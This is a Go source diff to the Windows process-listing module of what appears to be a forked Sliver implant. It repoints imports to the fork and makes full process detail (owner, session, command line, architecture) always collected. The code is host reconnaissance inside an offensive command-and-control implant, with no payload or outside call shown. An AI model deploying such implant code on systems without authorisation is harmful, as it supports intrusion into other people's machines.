@@ -5,13 +5,12 @@ package ps
 
 import (
 	"fmt"
+	"github.com/gsmith257-cyber/better-sliver-package/implant/sliver/syscalls"
+	"golang.org/x/sys/windows"
 	"runtime"
 	"strings"
 	"syscall"
 	"unsafe"
-
-	"github.com/bishopfox/sliver/implant/sliver/syscalls"
-	"golang.org/x/sys/windows"
 )
 
 // WindowsProcess is an implementation of Process for Windows.
@@ -53,7 +52,7 @@ func (p *WindowsProcess) SessionID() int {
 	return p.sessionID
 }
 
-func newWindowsProcess(e *syscall.ProcessEntry32, fullInfo bool) *WindowsProcess {
+func newWindowsProcess(e *syscall.ProcessEntry32) *WindowsProcess {
 	// Find when the string ends for decoding
 	end := 0
 	for {
@@ -62,33 +61,24 @@ func newWindowsProcess(e *syscall.ProcessEntry32, fullInfo bool) *WindowsProcess
 		}
 		end++
 	}
+	account, _ := getProcessOwner(e.ProcessID)
+	sessionID, _ := getSessionID(e.ProcessID)
+	cmdLine, _ := getCmdLine(e.ProcessID)
+	arch, _ := getProcessArchitecture(e.ProcessID)
 
-	if fullInfo {
-		account, _ := getProcessOwner(e.ProcessID)
-		sessionID, _ := getSessionID(e.ProcessID)
-		cmdLine, _ := getCmdLine(e.ProcessID)
-		arch, _ := getProcessArchitecture(e.ProcessID)
-
-		return &WindowsProcess{
-			pid:       int(e.ProcessID),
-			ppid:      int(e.ParentProcessID),
-			exe:       syscall.UTF16ToString(e.ExeFile[:end]),
-			owner:     account,
-			cmdLine:   cmdLine,
-			arch:      arch,
-			sessionID: sessionID,
-		}
-	} else {
-		return &WindowsProcess{
-			pid:  int(e.ProcessID),
-			ppid: int(e.ParentProcessID),
-			exe:  syscall.UTF16ToString(e.ExeFile[:end]),
-		}
+	return &WindowsProcess{
+		pid:       int(e.ProcessID),
+		ppid:      int(e.ParentProcessID),
+		exe:       syscall.UTF16ToString(e.ExeFile[:end]),
+		owner:     account,
+		cmdLine:   cmdLine,
+		arch:      arch,
+		sessionID: sessionID,
 	}
 }
 
-func findProcess(pid int, fullInfo bool) (Process, error) {
-	ps, err := processes(fullInfo)
+func findProcess(pid int) (Process, error) {
+	ps, err := processes()
 	if err != nil {
 		return nil, err
 	}
@@ -135,7 +125,7 @@ func getProcessOwner(pid uint32) (owner string, err error) {
 		return
 	}
 	defer syscall.CloseHandle(handle)
-
+	
 	var token syscall.Token
 	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_QUERY, &token); err != nil {
 		return
@@ -151,7 +141,7 @@ func getProcessOwner(pid uint32) (owner string, err error) {
 	return
 }
 
-func processes(fullInfo bool) ([]Process, error) {
+func processes() ([]Process, error) {
 	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
 		return nil, err
@@ -166,7 +156,7 @@ func processes(fullInfo bool) ([]Process, error) {
 
 	results := make([]Process, 0, 50)
 	for {
-		results = append(results, newWindowsProcess(&entry, fullInfo))
+		results = append(results, newWindowsProcess(&entry))
 
 		err = syscall.Process32Next(handle, &entry)
 		if err != nil {
@@ -259,6 +249,7 @@ func getCmdLine(pid uint32) ([]string, error) {
 		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
 	}
 
+
 	err = syscall.CloseHandle(proc)
 	if err != nil {
 		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
@@ -278,7 +269,7 @@ func getProcessArchitecture(pid uint32) (string, error) {
 			nativeArch = "x86_64"
 		} else {
 			var is64Bit bool
-			pHandle := windows.CurrentProcess()
+			pHandle, _ := windows.GetCurrentProcess()
 			if uint(pHandle) == 0 {
 				nativeArch = ""
 			} else if err := windows.IsWow64Process(pHandle, &is64Bit); err != nil {
